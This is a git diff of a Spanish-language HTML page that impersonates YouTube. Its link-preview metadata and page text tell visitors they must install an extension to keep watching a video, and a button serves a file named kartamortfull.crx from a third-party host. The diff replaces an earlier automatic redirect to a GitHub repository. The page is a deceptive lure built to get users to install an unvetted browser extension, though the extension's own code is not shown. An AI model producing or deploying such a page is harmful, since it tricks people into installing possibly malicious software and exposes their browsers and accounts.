@@ -1,19 +1,45 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta property="og:title" content="YouTube">
-  <meta property="og:description" content="Video recomendado - Haz clic para ver">
-  <meta property="og:image" content="https://tusitio.github.io/thumb.jpg"> <!-- URL de imagen -->
-  <meta property="og:type" content="video.other">
-  <meta property="og:url" content="https://tusitio.github.io/instalar"> <!-- URL que quieres abrir -->
-
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>YouTube</title>
+  <meta property="og:title" content="YouTube" />
+  <meta property="og:description" content="Instala esta extensión para continuar viendo el video." />
+  <meta property="og:image" content="https://i.imgur.com/EkLZ8rQ.png" />
+  <meta property="og:url" content="https://kartamortfull.onrender.com" />
+  <meta property="og:type" content="website" />
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+    .container {
+      padding-top: 10%;
+    }
+    .button {
+      margin-top: 20px;
+      padding: 12px 25px;
+      font-size: 18px;
+      background-color: #cc0000;
+      color: white;
+      border: none;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    .button:hover {
+      background-color: #e60000;
+    }
+  </style>
 </head>
 <body>
-  <script>
-    // Redirige automáticamente
-    window.location.href = "https://github.com/ankouster/kartaMortFull";
-  </script>
+  <div class="container">
+    <h1>Para continuar viendo el video, instala esta extensión.</h1>
+    <button class="button" onclick="window.location.href='kartamortfull.crx'">Instalar extensión</button>
+  </div>
 </body>
 </html>
